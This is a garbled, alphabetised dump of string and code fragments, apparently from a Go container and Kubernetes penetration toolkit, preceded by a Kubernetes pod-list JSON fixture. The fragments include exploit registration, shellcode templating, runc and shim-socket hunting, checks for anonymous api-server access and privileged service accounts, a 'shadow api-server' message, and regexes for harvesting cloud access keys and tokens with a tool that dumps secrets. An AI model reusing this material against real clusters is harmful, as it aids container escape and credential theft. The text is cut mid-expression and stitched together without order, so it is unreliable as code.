"name"":""ACS_DISK"",""value"":""true""},{""name"":""ACS_NAS"",""value"":""true""},{""name"":""ACS_OSS"",""value"":""true""},{""name"":""ACS_CPFS"",""value"":""false""}],""resources"":{""limits"":{""cpu"":""1"",""memory"":""1000Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""usrdir"",""mountPath"":""/host/usr/""},{""name"":""etcdir"",""mountPath"":""/host/etc/""},{""name"":""logdir"",""mountPath"":""/var/log/alicloud/""},{""name"":""kubeletdir"",""mountPath"":""/var/lib/kubelet"",""mountPropagation"":""Bidirectional""},{""name"":""default-token-cmtwb"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls /acs/flexvolume""]},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""Always"",""securityContext"":{""privileged"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""default"",""serviceAccount"":""default"",""nodeName"":""cn-beijing.192.168.0.151"",""hostNetwork"":true,""hostPID"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.151""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:37Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:37Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""}],""hostIP"":""192.168.0.151"",""podIP"":""192.168.0.151"",""podIPs"":[{""ip"":""192.168.0.151""}],""startTime"":""2020-04-08T04:12:29Z"",""containerStatuses"":[{""name"":""acs-flexvolume"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:35Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume@sha256:b17527284ff2c593e0a68b114494b2ebad044004e86a94c94047f2d2771e7e1b"",""containerID"":""docker://d05f598cdce391445876d280cb38b141ad9c914e0a18e2c7d12ba4a215750499"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""flexvolume-hps4x"",""generateName"":""flexvolume-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/flexvolume-hps4x"",""uid"":""81252af1-d0c2-43ef-9b00-f669a68cee9e"",""resourceVersion"":""1777"",""creationTimestamp"":""2020-04-08T04:12:29Z"",""labels"":{""controller-revision-hash"":""bfc484779"",""name"":""acs-flexvolume"",""pod-template-generation"":""1""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""flexvolume"",""uid"":""7eb1d60b-0e68-4ae0-8554-5f9c4e52f2bd"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""usrdir"",""hostPath"":{""path"":""/usr/"",""type"":""""}},{""name"":""etcdir"",""hostPath"":{""path"":""/etc/"",""type"":""""}},{""name"":""logdir"",""hostPath"":{""path"":""/var/log/alicloud/"",""type"":""""}},{""name"":""kubeletdir"",""hostPath"":{""path"":""/var/lib/kubelet"",""type"":""Directory""}},{""name"":""default-token-cmtwb"",""secret"":{""secretName"":""default-token-cmtwb"",""defaultMode"":420}}],""containers"":[{""name"":""acs-flexvolume"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""env"":[{""name"":""ACS_DISK"",""value"":""true""},{""name"":""ACS_NAS"",""value"":""true""},{""name"":""ACS_OSS"",""value"":""true""},{""name"":""ACS_CPFS"",""value"":""false""}],""resources"":{""limits"":{""cpu"":""1"",""memory"":""1000Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""usrdir"",""mountPath"":""/host/usr/""},{""name"":""etcdir"",""mountPath"":""/host/etc/""},{""name"":""logdir"",""mountPath"":""/var/log/alicloud/""},{""name"":""kubeletdir"",""mountPath"":""/var/lib/kubelet"",""mountPropagation"":""Bidirectional""},{""name"":""default-token-cmtwb"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls /acs/flexvolume""]},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""Always"",""securityContext"":{""privileged"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""default"",""serviceAccount"":""default"",""nodeName"":""cn-beijing.192.168.0.155"",""hostNetwork"":true,""hostPID"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.155""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:45Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:45Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""}],""hostIP"":""192.168.0.155"",""podIP"":""192.168.0.155"",""podIPs"":[{""ip"":""192.168.0.155""}],""startTime"":""2020-04-08T04:12:29Z"",""containerStatuses"":[{""name"":""acs-flexvolume"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:45Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume@sha256:b17527284ff2c593e0a68b114494b2ebad044004e86a94c94047f2d2771e7e1b"",""containerID"":""docker://4c9610e623f19098a3702d632a84bf6284ab232627d986e9d99fba0f3a621ca0"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""flexvolume-lvxmt"",""generateName"":""flexvolume-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/flexvolume-lvxmt"",""uid"":""b5587527-5e4e-45d9-83cf-842b38c4150b"",""resourceVersion"":""1644"",""creationTimestamp"":""2020-04-08T04:12:29Z"",""labels"":{""controller-revision-hash"":""bfc484779"",""name"":""acs-flexvolume"",""pod-template-generation"":""1""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""flexvolume"",""uid"":""7eb1d60b-0e68-4ae0-8554-5f9c4e52f2bd"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""usrdir"",""hostPath"":{""path"":""/usr/"",""type"":""""}},{""name"":""etcdir"",""hostPath"":{""path"":""/etc/"",""type"":""""}},{""name"":""logdir"",""hostPath"":{""path"":""/var/log/alicloud/"",""type"":""""}},{""name"":""kubeletdir"",""hostPath"":{""path"":""/var/lib/kubelet"",""type"":""Directory""}},{""name"":""default-token-cmtwb"",""secret"":{""secretName"":""default-token-cmtwb"",""defaultMode"":420}}],""containers"":[{""name"":""acs-flexvolume"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""env"":[{""name"":""ACS_DISK"",""value"":""true""},{""name"":""ACS_NAS"",""value"":""true""},{""name"":""ACS_OSS"",""value"":""true""},{""name"":""ACS_CPFS"",""value"":""false""}],""resources"":{""limits"":{""cpu"":""1"",""memory"":""1000Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""usrdir"",""mountPath"":""/host/usr/""},{""name"":""etcdir"",""mountPath"":""/host/etc/""},{""name"":""logdir"",""mountPath"":""/var/log/alicloud/""},{""name"":""kubeletdir"",""mountPath"":""/var/lib/kubelet"",""mountPropagation"":""Bidirectional""},{""name"":""default-token-cmtwb"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls /acs/flexvolume""]},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""Always"",""securityContext"":{""privileged"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""default"",""serviceAccount"":""default"",""nodeName"":""cn-beijing.192.168.0.152"",""hostNetwork"":true,""hostPID"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.152""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:37Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:37Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""}],""hostIP"":""192.168.0.152"",""podIP"":""192.168.0.152"",""podIPs"":[{""ip"":""192.168.0.152""}],""startTime"":""2020-04-08T04:12:29Z"",""containerStatuses"":[{""name"":""acs-flexvolume"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:36Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume@sha256:b17527284ff2c593e0a68b114494b2ebad044004e86a94c94047f2d2771e7e1b"",""containerID"":""docker://cf0ae816d665f706fa0131c54dea7d3adf81957066b7b3f62eb49fc2c97a3591"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""flexvolume-x9wvb"",""generateName"":""flexvolume-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/flexvolume-x9wvb"",""uid"":""f0f163ce-3709-4e3d-a3ec-fd6d38b3a87b"",""resourceVersion"":""35736395"",""creationTimestamp"":""2020-04-08T04:12:29Z"",""labels"":{""controller-revision-hash"":""bfc484779"",""name"":""acs-flexvolume"",""pod-template-generation"":""1""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""flexvolume"",""uid"":""7eb1d60b-0e68-4ae0-8554-5f9c4e52f2bd"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""usrdir"",""hostPath"":{""path"":""/usr/"",""type"":""""}},{""name"":""etcdir"",""hostPath"":{""path"":""/etc/"",""type"":""""}},{""name"":""logdir"",""hostPath"":{""path"":""/var/log/alicloud/"",""type"":""""}},{""name"":""kubeletdir"",""hostPath"":{""path"":""/var/lib/kubelet"",""type"":""Directory""}},{""name"":""default-token-cmtwb"",""secret"":{""secretName"":""default-token-cmtwb"",""defaultMode"":420}}],""containers"":[{""name"":""acs-flexvolume"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""env"":[{""name"":""ACS_DISK"",""value"":""true""},{""name"":""ACS_NAS"",""value"":""true""},{""name"":""ACS_OSS"",""value"":""true""},{""name"":""ACS_CPFS"",""value"":""false""}],""resources"":{""limits"":{""cpu"":""1"",""memory"":""1000Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""usrdir"",""mountPath"":""/host/usr/""},{""name"":""etcdir"",""mountPath"":""/host/etc/""},{""name"":""logdir"",""mountPath"":""/var/log/alicloud/""},{""name"":""kubeletdir"",""mountPath"":""/var/lib/kubelet"",""mountPropagation"":""Bidirectional""},{""name"":""default-token-cmtwb"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls /acs/flexvolume""]},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""Always"",""securityContext"":{""privileged"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""default"",""serviceAccount"":""default"",""nodeName"":""cn-beijing.192.168.0.150"",""hostNetwork"":true,""hostPID"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.150""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:40Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:40Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""}],""hostIP"":""192.168.0.150"",""podIP"":""192.168.0.150"",""podIPs"":[{""ip"":""192.168.0.150""}],""startTime"":""2020-04-08T04:12:29Z"",""containerStatuses"":[{""name"":""acs-flexvolume"",""state"":{""running"":{""startedAt"":""2020-09-10T07:23:39Z""}},""lastState"":{""terminated"":{""exitCode"":255,""reason"":""Error"",""startedAt"":""2020-04-08T04:12:36Z"",""finishedAt"":""2020-09-10T07:23:17Z"",""containerID"":""docker://587d3eba0a667b7398654099f45e29fcaf3728c5f164a89e693a895c3132252c""}},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume@sha256:b17527284ff2c593e0a68b114494b2ebad044004e86a94c94047f2d2771e7e1b"",""containerID"":""docker://1f015d12fff55c6908d3a848471c96351afda5347e9c2b3853af0f645dc834f3"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""kube-apiserver-cn-beijing.192.168.0.150"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-apiserver-cn-beijing.192.168.0.150"",""uid"":""e2d1399d-4a4d-4d46-a1ed-9db5de9279eb"",""resourceVersion"":""35736383"",""creationTimestamp"":""2020-04-08T04:08:44Z"",""labels"":{""component"":""kube-apiserver"",""tier"":""control-plane""},""annotations"":{""kubernetes.io/config.hash"":""648fd8d160a03f8f137f14d7f47fad87"",""kubernetes.io/config.mirror"":""648fd8d160a03f8f137f14d7f47fad87"",""kubernetes.io/config.seen"":""2020-04-08T12:08:43.94847775"
"s, err := os.Stat(args[0])"
"s, err := os.Stat(path)"
"s.Init(tCellScreen, quit, userArg)"
"s:@]{3,20}:["
"s:@]{3,20}@.{1,100}["
"sLst := make([]string, 0, len(cgroupLst))"
"sLst = append(sLst, v.OriginalInfo)"
"s]"","
"s][0-9a-zA-Z]{32,45}['"
"s][0-9a-zA-Z]{35,40}['"
"s][0-9a-zA-Z]{35,44}['"
"scheduleExpr = """
"scheduleExpr = ""0 "
"scheduleExpr = ""0 0 "
"server, urlErr = ApiServerAddr()"
"serverVersion = strings.Split(serverVersion, ""-"")[0]"
"serverVersion, err := kubectl.GetServerVersion(serverAddr)"
"sessions in serverless functions will be killed in seconds, use this tool to dump AK/secrets in the fast way."
"setuidfiles = append(setuidfiles, dir "
"shell = ""/bin/csh"""
"shell = ""/bin/sh"""
"shell = ""cmd.exe"""
"shell = strings.Replace(shell, ""${hostPath}"", hostPath, -1)"
"shell = strings.Replace(shell, ""${outputFile}"", outputFile, -1)"
"shell = strings.Replace(shell, ""${shellCmd}"", shellCmd, -1)"
"shellCmd := strings.Join(args, "" "")"
"shellcode = fmt.Sprintf("""
"shimapi ""github.com/containerd/containerd/runtime/v1/shim/v1"""
"signal.Notify(sigs, syscall.SIGHUP, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT)"
"sigs := make(chan os.Signal, 1)"
"singleCG := strings.Split(strings.TrimSuffix(originalInfo, """
"sock = strings.Replace(sock, ""@"", """", -1)"
"socks, err := getShimSockets()"
"sort.Slice(results, func(i, j int) bool {"
"sort.Slice(sortedExploits, func(i, j int) bool {"
"sort.Slice(stats, func(i, j int) bool {"
"sortedExploits := make([]kv, 0)"
"sortedExploits = append(sortedExploits, kv{name, plugin.GetExploitType(), plugin.Desc()})"
"src_url=$(echo ""$EXP"" "
"sshd',"
"start, _ = strconv.Atoi(tIp[3])"
"stats, err := net.Connections(""all"")"
"status := item.Get(""status.phase"").String()"
"str := fmt.Sprintf(""%s "
"strconv.Itoa(handleFd), os.O_WRONLY"
"strings.Replace(image, "":"", """
"strings.TrimSuffix(sysToken, """
"strings.TrimSuffix(token, """
"subgroupName := ""/x_"" "
"subgroupName, DefaultFolderPerm)"
"successStr: ""GetLocalAddresses"","
"successStr: ""current user"","
"successStr: ""run success"","
"superBlockOptionsStr := strings.Join(mi.SuperBlockOptions, "","")"
"sv := gjson.Get(resp, ""etcdserver"").String()"
"switch Args[""<tool>""] {"
"switch strings.Compare(results[i].Target, results[j].Target) {"
"sysToken, err := kubectl.GetServiceAccountToken(conf.K8sSATokenDefaultPath)"
"syses = append(syses, v.ControllerLst)"
"t %s"", kv.ExploitType, kv.Name, kv.Desc)"
"t DESC"")"
"t"" // field separator"
"t"", """
"t"", -1)  // escape shell cmd"
"t%s"", env)"
"t.Errorf(""CapHexParser error parse %s: %s"", k, v)"
"t.Errorf((""parse cdk main failed, name: %s, args: %v, buf: %s""), tt.name, tt.args, str)"
"t.Errorf((""parse cdk main failed, name: %s, args: %v, buf: %s, out: %s""), tt.name, tt.args, buf.String()[:1000], string(out)[:1000])"
"t.Run(""TestBlankInString"", func(t "
"t.Run(key, func(t "
"t.Run(tt.name, func(t "
"tCellScreen, err := tcell.NewScreen()"
"tFind K8s api-server in ENV:"", addr)"
"tIp := strings.Split(ipStart, ""."")"
"tag="", -1), """")"
"tag=latest"""
"tapi-server forbids anonymous request."")"
"target := fmt.Sprintf(""%s:%d"", ip, port)"
"tcannot find RunC process inside container, exit."")"
"tcongrats, api-server allows anonymous request."")"
"tcontainer net namespace isolated."")"
"temp := fmt.Sprintf(""%s%s"", prefix, format)"
"testCase := []string{"""", ""any strings""}"
"text := ""err: cannot find kubernetes api host in ENV"""
"tfailed"")"
"tfailed."")"
"tgood luck and have fun."")"
"thost unix-socket found, seems container started with --net=host privilege."")"
"timeout, err := strconv.Atoi(args[3])"
"timeout:   timeout,"
"tls.Config{InsecureSkipVerify: true},"
"tmatched pid - "", f.Name())"
"tmpDir, err := os.MkdirTemp("""", "".bin"")"
"tmplist = append(tmplist, k)"
"to, _ = strconv.Atoi(fromTo[1])"
"token := """""
"token := regexp.MustCompile(""eyJh["
"token = """""
"token, _ = kubectl.SecretToken(conf.K8sSATokenDefaultPath)"
"token, _ = kubectl.SecretToken(tokenFlag)"
"token, err := ioutil.ReadFile(tokenPath)"
"token, tokenErr = GetServiceAccountToken(conf.K8sSATokenDefaultPath)"
"token, tokenErr = GetServiceAccountToken(tokenPath)"
"tokenPath = ""anonymous"""
"tokenPath = ""default"""
"tresponse:"" "
"trunk)-amd64},ubuntu=(10.04"
"trunk)-amd64},ubuntu=10.10"
"tservice-account is available"")"
"tservice-account is not available"")"
"tshadow api-server pod name:%s, namespace:%s, node name:%s"
"tsuccess, the service-account have a high authority."")"
"tsuccess, the system:anonymous role have a high authority."")"
"txtblu="""
"txtgray="""
"txtgrn="""
"txtred="""
"txtrst="""
"u, _ := url.Parse(endpoint)"
"u, _ := url.Parse(target)"
"u, err := url.Parse(args[0])"
"u, err := user.Current()"
"u.Port(), "":6443"", -1),"
"u.Scheme, u.Host, namespace, pod, container, url.QueryEscape(cmd))"
"u0026public=true""],""resources"":{""limits"":{""cpu"":""4"",""memory"":""8Gi""},""requests"":{""cpu"":""100m"",""memory"":""200Mi""}},""volumeMounts"":[{""name"":""admin-token-t8m2n"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""tcpSocket"":{""port"":443},""timeoutSeconds"":1,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""readinessProbe"":{""tcpSocket"":{""port"":443},""timeoutSeconds"":1,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""Always"",""securityContext"":{""capabilities"":{""add"":[""NET_RAW"",""NET_BIND_SERVICE""],""drop"":[""ALL""]}}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""serviceAccountName"":""admin"",""serviceAccount"":""admin"",""nodeName"":""cn-beijing.192.168.0.155"",""securityContext"":{},""schedulerName"":""default-scheduler"",""tolerations"":[{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:48Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:13:29Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:13:29Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:48Z""}],""hostIP"":""192.168.0.155"",""podIP"":""172.20.0.199"",""podIPs"":[{""ip"":""172.20.0.199""}],""startTime"":""2020-04-08T04:12:48Z"",""containerStatuses"":[{""name"":""metrics-server"",""state"":{""running"":{""startedAt"":""2020-04-08T04:13:22Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/metrics-server:v0.2.1-9dd9511-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/metrics-server@sha256:a8b5b9eb3964d508dbc2edd7b7b980633c55c24eadb5852c183c21782b67515d"",""containerID"":""docker://e1b6d1656a432be53cd23ebd02c75d8249556a8976e9fb4c312c94480aaae195"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""nginx-ingress-controller-5495b9fccf-6q5z2"",""generateName"":""nginx-ingress-controller-5495b9fccf-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/nginx-ingress-controller-5495b9fccf-6q5z2"",""uid"":""93add848-e132-43d0-bb85-0d953778e46c"",""resourceVersion"":""2135"",""creationTimestamp"":""2020-04-08T04:12:32Z"",""labels"":{""app"":""ingress-nginx"",""pod-template-hash"":""5495b9fccf""},""annotations"":{""kubernetes.io/psp"":""ack.privileged"",""prometheus.io/port"":""10254"",""prometheus.io/scrape"":""true""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""nginx-ingress-controller-5495b9fccf"",""uid"":""8d75401f-617c-40e9-a026-25418af036ff"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""localtime"",""hostPath"":{""path"":""/etc/localtime"",""type"":""File""}},{""name"":""nginx-ingress-controller-token-whd5r"",""secret"":{""secretName"":""nginx-ingress-controller-token-whd5r"",""defaultMode"":420}}],""initContainers"":[{""name"":""init-sysctl"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/busybox:v1.29.2"",""command"":[""/bin/sh"",""-c"",""mount -o remount rw /proc/sys"
"udpNetwork = ""udp"""
"uint32(os.FileMode(0700)), dev)"
"unknown=""[ ${txtgray}Unknown${txtrst}  ]"""
"uri := path.Join(""/logs/"", randomeFilename)"
"user, _ := p.Username()"
"util.GreenBold.Sprint(""Evaluate:""),"
"util.GreenBold.Sprint(""Exploit:""),"
"util.GreenBold.Sprint(""Tool:""),"
"util.MountInfo, filter string) bool {"
"util.PrintH2(""Discovery - Cloud Provider Metadata API"")"
"util.PrintH2(""Discovery - K8s API Server"")"
